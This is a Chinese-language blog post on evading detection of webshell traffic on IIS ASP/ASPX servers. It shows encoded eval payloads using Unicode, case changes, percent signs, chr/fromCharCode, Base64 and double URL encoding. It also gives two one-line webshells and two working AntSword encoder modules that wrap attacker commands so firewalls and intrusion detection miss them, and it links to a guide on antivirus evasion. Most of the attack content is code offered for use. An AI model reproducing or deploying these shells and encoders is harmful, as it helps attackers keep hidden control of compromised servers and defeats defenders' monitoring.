# ASP/ASPX下的流量混淆


<meta name="referrer" content="no-referrer" />

## 前言

今天谈一谈ASP/ASPX下的流量混淆姿势。

以执行`Response.Write("yzddmr6")`为例。

## 不带eval的普通编码方式

### Unicode(asp/aspx)

利用iis解析unicode的特性，我们可以像sql的bypass一样来用unicode编码绕过。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388250-4d5db9c7-0468-4ad2-998a-efdbf7aecbcd.png)

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388349-4be2e940-6312-43b3-bc7c-e8df62d5e9f4.png)

```
mr6=Response.Write("yzddmr6")
```

蚁剑中aspx类型shell默认有unicode编码器，但是asp中没有，可以自己手动添加一份。

### 大小写(asp)

asp对于大小写不敏感，所以可以对payload中的字符进行大小写变换。

```
mr6=REsponSe.WriTe("yzddmr6")
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388447-94bca03e-6125-4148-a08e-ec40265a9e91.png)

要注意的是aspx对大小写敏感，改变大小写之后会500。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388542-25ea48f9-09e9-4c97-ae4c-384a7ae6db46.png)

### 添加百分号(asp)

熟悉sql注入bypass的同学应该知道，iis+asp允许在每个字符前加一个`%`，此处同理。

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388678-f72cfc6d-e9f3-4177-8e43-523429b79f7e.png)

```
mr6=R%e%sp%o%n%se.w%ri%te("yzddmr6")
```

## 带eval的普通编码方式

有eval的情况下，无非是找找字符串变换函数来回套娃。

### ASCII码(asp/aspx)

asp下用chr函数+&连接

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388782-49c3c284-4838-4ecb-8e37-7e98cf1f1399.png)

```
mr6=eval(chr(82)%26chr(101)%26chr(115)%26chr(112)%26chr(111)%26chr(110)%26chr(115)%26chr(101)%26chr(46)%26chr(87)%26chr(114)%26chr(105)%26chr(116)%26chr(101)%26chr(40)%26chr(34)%26chr(121)%26chr(122)%26chr(100)%26chr(100)%26chr(109)%26chr(114)%26chr(54)%26chr(34)%26chr(41))
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388885-7df9dee3-79c8-422e-93da-bd79cd266c0c.png)

aspx下用String.fromCharCode+逗号连接

```
mr6=eval(String.fromCharCode(82,101,115,112,111,110,115,101,46,87,114,105,116,101,40,34,121,122,100,100,109,114,54,34,41),"unsafe")
```

### 字符拆分(asp/aspx)

asp下用`&`连接字符串，demo同`chr函数`。

aspx用`+`或者`concat`函数连接字符串

```
mr6=eval('Respons'%2B'e.Write("yzddmr6")',"unsafe")
mr6=eval('Respons'.concat('e.Write("yzddmr6")'),"unsafe")
```

### Base64编码(aspx)

```
mr6=eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("UmVzcG9uc2UuV3JpdGUoInl6ZGRtcjYiKTs=")),"unsafe");
```

### Url编码(asp)

asp

```
eval(unescape("%25%35%32%25%36%35%25%37%33%25%37%30%25%36%66%25%36%65%25%37%33%25%36%35%25%32%65%25%35%37%25%37%32%25%36%39%25%37%34%25%36%35%25%32%38%25%32%32%25%37%39%25%37%61%25%36%34%25%36%34%25%36%64%25%37%32%25%33%36%25%32%32%25%32%39"))
```

## 非常规shell下的编码

以上都是针对于基础类型的shell的流量混淆方法，如果不在最外层再套娃一次的话还是很容易被识别，这里给出几个demo。

### base64_bypass(aspx)

shell

```
<%@ Page Language="Jscript"%>
<%eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["mr6"])),"unsafe");%>
```

可以按照https://yzddmr6.tk/posts/webshell-venom-aspx/ 这篇文章做一下免杀

base64_bypass编码器

```
//
// aspx::base64_bypass 编码模块
// 把所有参数都进行base64编码
// author：yzddmr6
'use strict';
module.exports = (pwd, data, ext = null) => {
  let randomID;
  if (ext.opts.otherConf['use-random-variable'] === 1) {
    randomID = antSword.utils.RandomChoice(antSword['RANDOMWORDS']);
  } else {
    randomID = `${antSword['utils'].RandomLowercase()}${Math.random().toString(16).substr(2)}`;
  }
  data[randomID] = Buffer
    .from(data['_'])
    .toString('base64');
  data[pwd] = Buffer.from(`eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String(Request.Item["${randomID}"])),"unsafe");`).toString('base64');
  delete data['_'];
  return data;
}
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900388987-30c329f6-778e-42b8-9119-3d93d9942d96.png)

### url_bypass(asp)

shell

```
<%execute(unescape(request("mr6")))%>
```

url_bypass编码器

```
/**
 * asp::url_bypass 编码器
 * 双重url编码
 * author: yzddmr6
 * <%execute(unescape(request("mr6")))%>
 */
'use strict';
module.exports = (pwd, data) => {
    function str2url(str) {
        var ret = "";
        for (var i = 0; i < str.length; i++) {
          ret += "%"+str[i].charCodeAt().toString(16);
        }
        return ret;
      }
    data[pwd] = `asunescape(${str2url(str2url(data['_']))})`;
    delete data['_'];
    return data;
}
```

![img](https://cdn.nlark.com/yuque/0/2021/png/1599908/1623900389090-e41b260b-4d1e-497f-a5ef-7ce24ee8b265.png)

## 最后

个人推荐的做法还是类似随机cookie编码器那种一次一密的做法，不过可能asp/aspx实现起来不像php那么方便，有空了研究一下。

上面所提到的编码方式可以相互套娃，效果可能更佳。

如果其他想法后面再补上，此贴长期更新。






